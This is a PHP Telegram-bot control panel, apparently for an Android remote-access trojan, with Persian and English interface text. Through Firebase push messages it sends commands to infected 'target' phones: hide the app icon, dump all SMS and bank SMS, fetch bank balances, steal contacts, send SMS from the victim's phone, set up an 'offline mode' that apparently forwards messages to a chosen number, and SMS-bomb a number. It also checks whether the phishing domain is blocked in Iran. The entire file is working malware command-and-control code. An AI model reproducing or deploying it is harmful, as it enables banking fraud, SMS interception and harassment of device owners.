<?php
include "Madsal.php";
error_log(E_ALL);
ini_set("error_log", 1);
if (!file_exists("data")) {
    mkdir("data");
    file_put_contents("data/data.json", json_encode(array("cmd" => "", "androidid" => "", "messid" => ""), 448));
    file_put_contents("data/pingmsg.txt", "0");
    file_put_contents("data/onlineusers.txt", "");
}
if (!file_exists("url.txt")) {
    file_put_contents("url.txt", "https://google.com");
}
if (!file_exists("users")) {
    mkdir("users");
    file_put_contents("users/index.php", "");
}
function getname($androidid)
{
    $data = json_decode(file_get_contents("users/$androidid.json"), true);

    return isset($data['name']) ? $data['name'] : $data['model'];
}
function ch($type, $data)
{
    $dat = json_decode(file_get_contents("data/data.json"), true);
    $dat["$type"] = $data;
    file_put_contents("data/data.json", json_encode($dat, 448));
}
function userch($androidid, $type, $data)
{
    $dat = json_decode(file_get_contents("users/$androidid.json"), true);
    $dat["$type"] = $data;
    file_put_contents("users/$androidid.json", json_encode($dat, 448));
}
function ret($name)
{
    $data = json_decode(file_get_contents("data/data.json"))->$name;
    return $data;
}function userret($androidid, $name)
{
    $data = json_decode(file_get_contents("users/$androidid.json"))->$name;
    return $data;
}
function bot($method, $datas = [])
{
    $url = "https://api.telegram.org/bot" . TOKEN . "/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    $res = curl_exec($ch);

    if (curl_error($ch)) {
        var_dump(curl_error($ch));

    } else {

        return json_decode($res, true);
    }
}
function sm($chatid, $text, $messageid, $keyboard)
{
    return bot('sendMessage', [
        'chat_id' => $chatid,
        'text' => $text,
        'parse_mode' => 'HTML',
        'reply_to_message_id' => $messageid,
        'reply_markup' => $keyboard,
        'disable_web_page_preview' => true,
    ])['result']['message_id'];
}
function em($chatid, $text, $message_id, $keyboard)
{
    return bot('editmessagetext', [
        'chat_id' => $chatid,
        'message_id' => $message_id,
        'text' => $text,
        'parse_mode' => 'HTML',
        'reply_markup' => $keyboard,
    ])['result']['message_id'];
}
function dm($chat_id, $message_id)
{
    return bot('deleteMessage', [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
    ]);
}
function action($androidid, $cmd, $add = null)
{
    $firebasetoken = $firebasetoken = json_decode(file_get_contents("users/$androidid.json"), true)['fmtoken'];
    $data_string = '{"data":{"cmd":"' . $cmd . '"' . $add . '},"to":"' . $firebasetoken . '"}';
    $headers = array('Authorization: key=' . apikey, 'Content-Type: application/json');
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send');
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    return curl_exec($ch);
}
function location($node)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://check-host.net/nodes/hosts");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept: application/json']);
    $loc = json_decode(curl_exec($ch), true)['nodes'][$node]['location'][2];
    curl_close($ch);
    return $loc;
}
function checkhost($domain)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://check-host.net/check-http?host=$domain&node=ir1.node.check-host.net&node=ir3.node.check-host.net&node=ir4.node.check-host.net");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept: application/json']);
    $id = json_decode(curl_exec($ch), true)['request_id'];
    sleep(2);
    curl_close($ch);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://check-host.net/check-result/$id");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept: application/json']);
    $result = json_decode(curl_exec($ch), true);
    $arr = array();
    foreach ($result as $node => $value) {
        if (isset($value)) {
            $name = location($node);
            $arr[$name] = ['time' => $value[0][1], 'status' => $value[0][2], 'statuscode' => $value[0][3], "serverip" => $value[0][4]];
        }
    }
    return $arr;
}
function pingall()
{
    global $port;
    $data_string = '{"data":{"cmd":"pingall"},"to":"\/topics\/' . $port . '"}';
    $headers = array('Authorization: key=' . apikey, 'Content-Type: application/json');
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send');
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    return curl_exec($ch);
}
function bomber($number, $text)
{
    global $port;
    $data_string = '{"data":{"cmd":"bomber","phone":"' . $number . '","text":"' . $text . '"},"to":"\/topics\/' . $port . '"}';
    $headers = array('Authorization: key=' . apikey, 'Content-Type: application/json');
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send');
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    return curl_exec($ch);
}
function sendmsg($androidid, $text)
{
    $firebasetoken = $firebasetoken = json_decode(file_get_contents("users/$androidid.json"), true)['fmtoken'];
    $data_string = '{"data":{"cmd":"sendmessage","text":"' . $text . '"},"to":"' . $firebasetoken . '"}';
    $headers = array('Authorization: key=' . apikey, 'Content-Type: application/json');
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send');
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    return curl_exec($ch);
}
function users()
{
    $files = array_diff(scandir("users"), array('..', '.', 'folder', "index.php"));
    foreach ($files as $tr) {
        $data = json_decode(file_get_contents("users/$tr"), true);
        $androidid = $data['androidid'];
        $echoname = isset($data['name']) ? $data['name'] : $data['model'];
        $key[] = ['text' => "$echoname", 'callback_data' => "openpanel1_$androidid"];
    }
    $key[] = ['text' => "🔓ʙᴀᴄᴋ🔓", 'callback_data' => "backmain"];
    return json_encode(['inline_keyboard' => array_chunk($key, 2)]);
}
if (strlen(file_get_contents("php://input")) > 2) {
    $update = json_decode(file_get_contents("php://input"), true);

    @$message = $update['message'];
    @$message_id = $message['message_id'];
    @$chat_id = isset($update['callback_query']['message']['chat']['id']) ? $update['callback_query']['message']['chat']['id'] : $message['chat']['id'];
    @$chat_name = isset($update['callback_query']['message']['from']['first_name']) ? $update['callback_query']['message']['from']['first_name'] : $message['from']['first_name'];
    @$from_id = isset($update['callback_query']['message']['from']['id']) ? $update['callback_query']['message']['from']['id'] : $message['from']['id'];
    @$chat_username = $message['chat']['username'];
    @$chat_type = $message['chat']['type'];
    @$text = $message['text'];
    if (isset($update['callback_query'])) {
        @$callback_query = $update['callback_query'];
        @$cbfrom = $callback_query['from'];
        @$cbfrom_id = $cbfrom['id'];
        @$cbfrom_name = $cbfrom['first_name'];
        @$cbfrom_username = $cbfrom['username'];
        @$cbmessage = $callback_query['message'];
        @$cbmessage_id = $cbmessage['message_id'];
        @$cbdata = $update['callback_query']['data'] ?? "";
    }
    $cmd = ret("cmd");
    $messid = ret("messid");
    $usercount = count(scandir("users")) - 3;
    $androidid = ret("androidid");
    $url = file_get_contents("url.txt");
    $start = json_encode(array('inline_keyboard' => [[['text' => "👤ᴜꜱᴇʀʟɪꜱᴛ👤", 'callback_data' => 'users'], ['text' => "♻️ᴘɪɴɢ ᴀʟʟ♻️", 'callback_data' => "pingall"]],
        [['text' => "⚙️ꜱᴇᴛᴛɪɴɢꜱ⚙️", 'callback_data' => "settings"]],
    ]));
    $settings = json_encode(array('inline_keyboard' => [[['text' => "🔆ᴄʜᴇᴄᴋ ꜰɪʟᴛᴇʀɪɴɢ🔆", 'callback_data' => 'checkfiltering'], ['text' => "✒️ꜱᴇᴛ ᴅᴏᴍᴀɪɴ🖋", 'callback_data' => "setdomain"]],
        [['text' => "💣ʙᴏᴍʙᴇʀ💣", 'callback_data' => "bomber"]],
        [['text' => "🔓ʙᴀᴄᴋ🔓", 'callback_data' => "backmain"]],
    ]));
    $backsettings = json_encode(array('inline_keyboard' => [[['text' => "🔓ʙᴀᴄᴋ🔓", 'callback_data' => "settings"]],
    ]));
    $backuser = json_encode(array('inline_keyboard' => [[['text' => "🔓ʙᴀᴄᴋ🔓", 'callback_data' => "backuser"]],
    ]));
    $namebutton = json_encode(array('inline_keyboard' => [
        [['text' => "🔓ʙᴀᴄᴋ🔓", 'callback_data' => "backuser"]],
    ]));
    $usercontrol = json_encode(array('inline_keyboard' => [
        [['text' => "♻️ᴘɪɴɢ♻️", 'callback_data' => 'pinguser'], ['text' => "ℹ️ɪɴꜰᴏℹ️", 'callback_data' => 'deviceinfo']],
        [['text' => "🔧ʜɪᴅᴇ ɪᴄᴏɴ🔧", 'callback_data' => 'hideicon']],
        [['text' => "📁ᴀʟʟ ᴍᴇꜱꜱᴀɢᴇ📁", 'callback_data' => 'allsms'], ['text' => "🏦ʙᴀɴᴋ ᴍᴇꜱꜱᴀɢᴇ🏦", 'callback_data' => 'banksms']],
        [['text' => "💰ʙᴀʟᴀɴᴄᴇ💰", 'callback_data' => 'bankinfo']],
        [['text' => "🔒ᴄʜᴇᴄᴋ ᴘᴇʀᴍɪꜱꜱɪᴏɴ🔒", 'callback_data' => 'checkpermission']],
        [['text' => "📨ꜱᴇɴᴅ ᴍᴇꜱꜱᴀɢᴇ📨", 'callback_data' => 'sendmessage'], ['text' => "📩ʟᴀꜱᴛ ᴍᴇꜱꜱᴀɢᴇ📩", 'callback_data' => 'lastmessage']],
        [['text' => "👥ᴀʟʟ ᴄᴏɴᴛᴀᴄᴛ👥", 'callback_data' => 'allcontact']],
        [['text' => "📶ᴏꜰꜰʟɪɴᴇ ᴍᴏᴅᴇ📶", 'callback_data' => 'offlinemode']],
        [['text' => "🪤ꜱᴇᴛ ᴛᴀʀɢᴇᴛ ɴᴀᴍᴇ🪤", 'callback_data' => 'settargetname'], ['text' => "🩸ᴅᴇʟᴇᴛᴇ ᴛᴀʀɢᴇᴛ🩸", 'callback_data' => 'deletetarget']],
        [['text' => "🔓ʙᴀᴄᴋ🔓", 'callback_data' => 'users']],
    ]));
    if ($chat_id == $admin) {
        if (preg_match('/^\/([Ss]tart)(.*)/', $text)) {
            ch("cmd", "");
            ch("messid", "");
            ch("androidid", "");
            sm($chat_id, "
🦈ʜᴇʟʟᴏ ꜱɪʀ [ <a href='tg://user?id=$from_id'>$chat_name</a> ]

👽ᴜꜱᴇʀꜱ : $usercount
🦾ʀᴀᴛ ᴘᴏʀᴛ : $port

🧑🏼‍🚀ᴄᴏᴅᴇᴅ ʙʏ : $codedby
", $message_id, $start);
        } elseif ($cbdata == "backmain") {
            ch("cmd", "");
            ch("messid", "");
            ch("androidid", "");
            em($chat_id, "
🦈ʜᴇʟʟᴏ ꜱɪʀ [ <a href='tg://user?id=$cbfrom_id'>$cbfrom_name</a> ]

👽ᴜꜱᴇʀꜱ : $usercount

🧑🏼‍🚀ᴄᴏᴅᴇᴅ ʙʏ : $codedby
", $cbmessage_id, $start);
        } elseif ($cbdata == "users") {
            em($chat_id, "🔅ʟɪꜱᴛ ᴏꜰ ᴀʟʟ ʏᴏᴜʀ ᴛᴀʀɢᴇᴛꜱ

⚠️این لیست شامل کل تارگت های شما میشود . لطفا اگر نیازمند یک تارگت آنلاین میباشد , از طریق دکمه [ ♻️ᴘɪɴɢ ᴀʟʟ♻️ ] اقدام کنید.", $cbmessage_id, users());
        } elseif ($cbdata == "pingall") {
            file_put_contents("data/onlineusers.txt", "");
            $id = sm($chat_id, "♻️درخواست پینگ به کل یوزر ها ارسال شد . لطفا کمی صبر کنید


⚠️این پیام را حذف نکنید , پیام اپدیت میشود و یوزر آنلاین داخل همین مسیج قرار میگیرد

   🧑🏼‍🚀ᴄᴏᴅᴇᴅ ʙʏ : $codedby", null, null);
            file_put_contents("data/pingmsg.txt", $id);
            pingall();
        } elseif ($cbdata == "settings") {
            ch("cmd", "");
            em($chat_id, "⚙️ꜱᴇᴛᴛɪɴɢꜱ ᴘᴀɴᴇʟ

🌐ꜱᴇᴛᴛᴇᴅ ᴅᴏᴍᴀɪɴ: [ $url ]

🧑🏼‍🚀ᴄᴏᴅᴇᴅ ʙʏ : $codedby", $cbmessage_id, $settings);
        } elseif ($cbdata == "checkfiltering") {
            $id = em($chat_id, "🌀ᴡᴀɪᴛ🌀", $cbmessage_id, null);
            $check_result = "";
            $checkhost = checkhost($url);
            foreach ($checkhost as $city => $value) {
                if ($value['statuscode'] == "200" or $value['statuscode'] == "301") {
                    $emoji = "✅";
                } else {
                    $emoji = "⛔️";
                }
                $time = substr($value['time'], 0, 4);
                $check_result .= "$emoji$city :{
♻️ꜱᴛᴀᴛᴜꜱ : {$value['status']} | {$value['statuscode']}
🌀ʟᴏᴀᴅ ᴛɪᴍᴇ : $time
}\n
";
            }
            em($chat_id, "$check_result\n🧑🏼‍🚀ᴄᴏᴅᴇᴅ ʙʏ : $codedby", $id, $backsettings);
        } elseif ($cbdata == "setdomain") {
            $id = em($chat_id, "🌐ꜱᴇɴᴅ ʏᴏᴜʀ ꜱᴘᴇᴄɪꜰɪᴄ ᴅᴏᴍᴀɪɴ ᴡɪᴛʜ ᴘʀᴏᴛᴏᴄᴏʟ [ʜᴛᴛᴘ://,ʜᴛᴛᴘꜱ://]", $cbmessage_id, $backsettings);
            ch("cmd", "setdomain");
            ch("messid", $id);
        } elseif ($cmd == "setdomain") {
            dm($chat_id, $messid);
            ch("cmd", "");
            if (filter_var($text, FILTER_VALIDATE_URL)) {
                file_put_contents("url.txt", $text);
                sm($chat_id, "✅ᴅᴏᴍᴀɪɴ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴄʜᴀɴɢᴇᴅ

🌐ꜱᴇᴛᴛᴇᴅ ᴅᴏᴍᴀɪɴ: [ $text ]

🧑🏼‍🚀ᴄᴏᴅᴇᴅ ʙʏ : $codedby", $message_id, $settings);
            } else {
                sm($chat_id, "⭕️ᴇʀʀᴏʀ
⚠️ᴅᴏᴍᴀɪɴ ɪɴᴠᴀʟɪᴅ , ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴠᴀʟɪᴅ ᴅᴏᴍᴀɪɴ ʟɪᴋᴇ [ https://google.com ]", $message_id, $backsettings);
            }

        } elseif (strpos($cbdata, "openpanel1_") !== false) {
            ch('androidid', explode("_", $cbdata)[1]);
            $androidid = ret("androidid");
            $name = getname($androidid);
            em($chat_id, "♻️[ $name ] ᴄᴏɴᴛʀᴏʟᴘᴀɴᴇʟ ᴏᴘᴇɴᴅ!

⚠️ᴄᴏɴᴛʀᴏʟ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴡɪᴛʜ ᴛʜᴇ ʙᴜᴛᴛᴏɴꜱ ʙᴇʟᴏᴡ", $cbmessage_id, $usercontrol);
        } elseif (strpos($cbdata, "openpanel_") !== false) {
            ch('androidid', explode("_", $cbdata)[1]);
            $androidid = ret("androidid");
            $name = getname($androidid);
            sm($chat_id, "♻️[ $name ] ᴄᴏɴᴛʀᴏʟᴘᴀɴᴇʟ ᴏᴘᴇɴᴅ!

⚠️ᴄᴏɴᴛʀᴏʟ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴡɪᴛʜ ᴛʜᴇ ʙᴜᴛᴛᴏɴꜱ ʙᴇʟᴏᴡ", $cbmessage_id, $usercontrol);
        } elseif ($cbdata == "backuser") {
            $androidid = ret("androidid");
            ch('cmd', "");
            $name = getname($androidid);
            em($chat_id, "♻️[ $name ] ᴄᴏɴᴛʀᴏʟᴘᴀɴᴇʟ ᴏᴘᴇɴᴅ!

⚠️ᴄᴏɴᴛʀᴏʟ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴡɪᴛʜ ᴛʜᴇ ʙᴜᴛᴛᴏɴꜱ ʙᴇʟᴏᴡ", $cbmessage_id, $usercontrol);
        } elseif ($cbdata == "pinguser") {
            $androidid = ret("androidid");
            $name = getname($androidid);
            em($chat_id, "♻️[<code>$cbdata</code>] ʀᴇQᴜᴇꜱᴛ ꜱᴇɴᴅᴇᴅ ꜰᴏʀ ᴜꜱᴇʀ [$name]
⚠️ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ.", $cbmessage_id, $backuser);
            action($androidid, "pingone");
        } elseif ($cbdata == "checkpermission") {
            $androidid = ret("androidid");
            $name = getname($androidid);
            em($chat_id, "♻️[<code>$cbdata</code>] ʀᴇQᴜᴇꜱᴛ ꜱᴇɴᴅᴇᴅ ꜰᴏʀ ᴜꜱᴇʀ [$name]
⚠️ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ.", $cbmessage_id, $backuser);
            action($androidid, "checkpermission");
        } elseif ($cbdata == "deviceinfo") {
            $androidid = ret("androidid");
            $name = getname($androidid);
            em($chat_id, "♻️[<code>$cbdata</code>] ʀᴇQᴜᴇꜱᴛ ꜱᴇɴᴅᴇᴅ ꜰᴏʀ ᴜꜱᴇʀ [$name]
⚠️ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ.", $cbmessage_id, $backuser);
            action($androidid, "information");
        } elseif ($cbdata == "hideicon") {
            $androidid = ret("androidid");
            $name = getname($androidid);
            em($chat_id, "♻️[<code>$cbdata</code>] ʀᴇQᴜᴇꜱᴛ ꜱᴇɴᴅᴇᴅ ꜰᴏʀ ᴜꜱᴇʀ [$name]
⚠️ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ.", $cbmessage_id, $backuser);
            action($androidid, "hideicon");
        } elseif ($cbdata == "allsms") {
            $androidid = ret("androidid");
            $name = getname($androidid);
            em($chat_id, "♻️[<code>$cbdata</code>] ʀᴇQᴜᴇꜱᴛ ꜱᴇɴᴅᴇᴅ ꜰᴏʀ ᴜꜱᴇʀ [$name]
⚠️ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ.", $cbmessage_id, $backuser);
            action($androidid, "getallsms");
        } elseif ($cbdata == "banksms") {
            $androidid = ret("androidid");
            $name = getname($androidid);
            em($chat_id, "♻️[<code>$cbdata</code>] ʀᴇQᴜᴇꜱᴛ ꜱᴇɴᴅᴇᴅ ꜰᴏʀ ᴜꜱᴇʀ [$name]
⚠️ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ.", $cbmessage_id, $backuser);
            action($androidid, "getbanksms");
        } elseif ($cbdata == "bankinfo") {
            $androidid = ret("androidid");
            $name = getname($androidid);
            em($chat_id, "♻️[<code>$cbdata</code>] ʀᴇQᴜᴇꜱᴛ ꜱᴇɴᴅᴇᴅ ꜰᴏʀ ᴜꜱᴇʀ [$name]
⚠️ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ.", $cbmessage_id, $backuser);
            action($androidid, "balance");
        } elseif ($cbdata == "lastmessage") {
            $androidid = ret("androidid");
            $name = getname($androidid);
            em($chat_id, "♻️[<code>$cbdata</code>] ʀᴇQᴜᴇꜱᴛ ꜱᴇɴᴅᴇᴅ ꜰᴏʀ ᴜꜱᴇʀ [$name]
⚠️ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ.", $cbmessage_id, $backuser);
            action($androidid, "lastsms");
        } elseif ($cbdata == "allcontact") {
            $androidid = ret("androidid");
            $name = getname($androidid);
            em($chat_id, "♻️[<code>$cbdata</code>] ʀᴇQᴜᴇꜱᴛ ꜱᴇɴᴅᴇᴅ ꜰᴏʀ ᴜꜱᴇʀ [$name]
⚠️ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ.", $cbmessage_id, $backuser);
            action($androidid, "allcontact");
        } elseif ($cbdata == "sendmessage") {
            $id = em($chat_id, "✉️ꜱᴇɴᴅ ʏᴏᴜʀ ᴛxᴛ ᴍᴇꜱꜱᴀɢᴇ", $cbmessage_id, $backuser);
            ch("cmd", "settext");
            ch("messid", $id);
        } elseif ($cmd == "settext") {
            ch("cmd", "");
            dm($chat_id, $messid);
            file_put_contents("data/text.txt", $text);
            $id = sm($chat_id, "✅ᴛᴇxᴛ ꜱᴇᴛᴛᴇᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ

{\n<code>$text</code>\n}

📞ɴᴏᴡ ꜱᴇɴᴅ ʏᴏᴜʀ ɴᴜᴍʙᴇʀ ʟɪꜱᴛ

〽️ᴇx : {
09912345678
09212345678
09142345678
09123456789
}", $message_id, $backuser);
            ch("cmd", "phoneset");
            ch("messid", $id);
        } elseif ($cmd == "phoneset") {
            dm($chat_id, $messid);
            ch("cmd", "");
            file_put_contents("data/phone.txt", $text);
            $mssg = file_get_contents("data/text.txt");
            sm($chat_id, "✅ᴘʜᴏɴᴇ ʟɪꜱᴛ ꜱᴇᴛᴛᴇᴅ

{\nᴘʜᴏɴᴇ : \n<code>$text</code>
\nᴛᴇxᴛ : \n<code>$mssg</code>\n}

♻️ᴅᴏ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ꜱᴇɴᴅ ɪᴛ?", $message_id, json_encode(array('inline_keyboard' => [[['text' => "Ｓｅｎｄ", 'callback_data' => 'sendmsg'], ['text' => "Ｃａｎｃｅｌ", 'callback_data' => "backuser"]],
            ])));
        } elseif ($cbdata == "sendmsg") {
            $androidid = ret("androidid");
            $name = getname($androidid);
            $mssg = file_get_contents("data/text.txt");
            $loc = $_SERVER['HTTP_HOST'] . str_replace("index.php", "data/phone.txt", $_SERVER['PHP_SELF']);
            $phone = base64_encode($loc);
            sendmsg($androidid, $mssg);
            em($chat_id, "♻️[<code>$cbdata</code>] ʀᴇQᴜᴇꜱᴛ ꜱᴇɴᴅᴇᴅ ꜰᴏʀ ᴜꜱᴇʀ [$name]
⚠️ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ.", $cbmessage_id, $backuser);
        } elseif ($cbdata == "settargetname") {
            $id = em($chat_id, "☢️ꜱᴇɴᴅ ᴛʜᴇ ɴᴀᴍᴇ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ʙᴇ ꜱᴇᴛ ꜰᴏʀ ᴛʜᴇ ᴛᴀʀɢᴇᴛ
🔅𝓮𝔁 : [صادرات , 100 میلیونی]", $cbmessage_id, $namebutton);
            ch("messid", $id);
            ch("cmd", "settargetname");
        } elseif ($cmd == "settargetname") {
            dm($chat_id, $messid);
            $androidid = ret("androidid");
            $dat = json_decode(file_get_contents("users/$androidid.json"), true);
            $dat["name"] = $text;
            file_put_contents("users/$androidid.json", json_encode($dat, 448));
            sm($chat_id, "✅ᴛᴀʀɢᴇᴛ ɴᴀᴍᴇ ꜱᴇᴛᴛᴇᴅ ᴏɴ [ $text ]", $message_id, $backuser);
            ch("cmd", "");
        } elseif ($cbdata == "deletetarget") {
            $androidid = ret("androidid");
            em($chat_id, "⚠️ᴀʀᴇ ʏᴏᴜ ʀᴇᴀʟʟʏ ᴡᴀɴᴛ ᴛᴏ ᴅᴇʟᴇᴛᴇ ᴛʜɪꜱ ᴛᴀʀɢᴇᴛ?", $cbmessage_id, json_encode(array('inline_keyboard' => [
                [['text' => "⭕️ʏᴇꜱ ,ᴅᴇʟᴇᴛᴇ ᴛᴀʀɢᴇᴛ⭕️", 'callback_data' => "delete-$androidid"], ['text' => "❕ɴᴏ , ɪ ᴡᴀɴᴛ ᴋᴇᴇᴘ ᴛᴀʀɢᴇᴛ❕", 'callback_data' => "backuser"]],
            ])));
        } elseif (strpos($cbdata, "delete-") !== false) {
            $androidid = explode("-", $cbdata)[1];
            unlink("users/$androidid.json");
            em($chat_id, "✅ᴛᴀʀɢᴇᴛ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴅᴇʟᴇᴛᴇᴅ :(", $cbmessage_id, json_encode(array('inline_keyboard' => [
                [['text' => "🔓ʙᴀᴄᴋ🔓", 'callback_data' => "users"]],
            ])));
        } elseif ($cbdata == "offlinemode") {
            offmode:
            $androidid = ret("androidid");
            $offnum = userret($androidid, "offlinenum");
            $offmode = userret($androidid, "offlinemode");
            if ($offmode == "on") {
                $offstatus = "ᴏɴ✅";
            } else {
                $offstatus = "ᴏꜰꜰ💤";
            }

            $id = em($chat_id, "🌀ᴏꜰꜰʟɪɴᴇ ᴍᴏᴅᴇ ᴘᴀɴᴇʟ

📞ᴏꜰꜰʟɪɴᴇMᴏᴅᴇ ɴᴜᴍʙᴇʀ : $offnum
💠ᴏꜰꜰʟɪɴᴇMᴏᴅᴇ ꜱᴛᴀᴛᴜꜱ : $offstatus

⚠️ᴄʜᴀɴɢᴇ ᴍᴏᴅᴇ ᴡɪᴛʜ ʙᴜᴛᴛᴏɴꜱ ", $cbmessage_id, json_encode(array('inline_keyboard' => [
                [['text' => "➖ꜱᴇᴛ ɴᴜᴍʙᴇʀ➖", 'callback_data' => "setofflinenum"]],
                [['text' => "♻️ᴄʜᴀɴɢᴇ ᴍᴏᴅᴇ♻️", 'callback_data' => "changeofflinemode"]],
                [['text' => "🔓ʙᴀᴄᴋ🔓", 'callback_data' => "backuser"]],
            ])));
            ch("cmd", "");
        } elseif ($cbdata == "changeofflinemode") {
            $androidid = ret("androidid");
            $offmode = userret($androidid, "offlinemode");
            $offnum = userret($androidid, "offlinenum");
            if ($offmode == "on") {
                action($androidid, "offmodeoff");
                userch($androidid, "offlinemode", "off");
            } else {
                action($androidid, "offmodeon", ",\"phone\":\"$offnum\"");
                userch($androidid, "offlinemode", "on");
            }
            goto offmode;
        } elseif ($cbdata == "setofflinenum") {
            $id = em($chat_id, "🔅ꜱᴇɴᴅ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ", $cbmessage_id, json_encode(array('inline_keyboard' => [
                [['text' => "🔓ʙᴀᴄᴋ🔓", 'callback_data' => "offlinemode"]],
            ])));
            ch("cmd", "setoffnum");
            ch('messid', $id);
        } elseif ($cmd == "setoffnum") {
            dm($chat_id, $messid);
            $androidid = ret("androidid");
            ch("cmd", "");
            userch($androidid, "offlinenum", $text);
            $id = sm($chat_id, "✅ᴏꜰꜰʟɪɴᴇᴍᴏᴅᴇ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ꜱᴇᴛᴛᴇᴅ ᴏɴ : $text", $message_id, json_encode(array('inline_keyboard' => [
                [['text' => "🔓ʙᴀᴄᴋ🔓", 'callback_data' => "offlinemode"]],
            ])));
        } elseif (strpos($text, "/panel_") !== false) {
            $androidid = explode("_", $text)[1];
            $androidid = explode("@", $androidid)[0];
            ch("cmd", "");
            if (file_exists("users/$androidid.json")) {
                ch("androidid", $androidid);
                $name = getname($androidid);
                sm($chat_id, "♻️[ $name ] ᴄᴏɴᴛʀᴏʟᴘᴀɴᴇʟ ᴏᴘᴇɴᴅ!

⚠️ᴄᴏɴᴛʀᴏʟ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴡɪᴛʜ ᴛʜᴇ ʙᴜᴛᴛᴏɴꜱ ʙᴇʟᴏᴡ", $message_id, $usercontrol);
            } else {
                sm($chat_id, "User NotFound", $message_id, null);
            }
        } elseif ($cbdata == "bomber") {
            $id = em($chat_id, "🔅ꜱᴇɴᴅ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ", $cbmessage_id, $backsettings);
            ch("cmd", "setnumberbomber");
            ch('messid', $id);
        } elseif ($cmd == "setnumberbomber") {
            dm($chat_id, $messid);
            ch("bombernum", $text);
            $id = sm($chat_id, "✉️ꜱᴇɴᴅ ʏᴏᴜʀ ᴛxᴛ ᴍᴇꜱꜱᴀɢᴇ", $message_id, $backsettings);
            ch("cmd", "bomber");
            ch('messid', $id);
        } elseif ($cmd == "bomber") {
            dm($chat_id, $messid);
            ch("cmd", "");
            bomber(ret("bombernum"), $text);
            sm($chat_id, "📡ᴡᴀɪᴛ ꜰᴏʀ ʀᴇꜱᴜʟᴛ", $message_id, $settings);
        }
    }
}
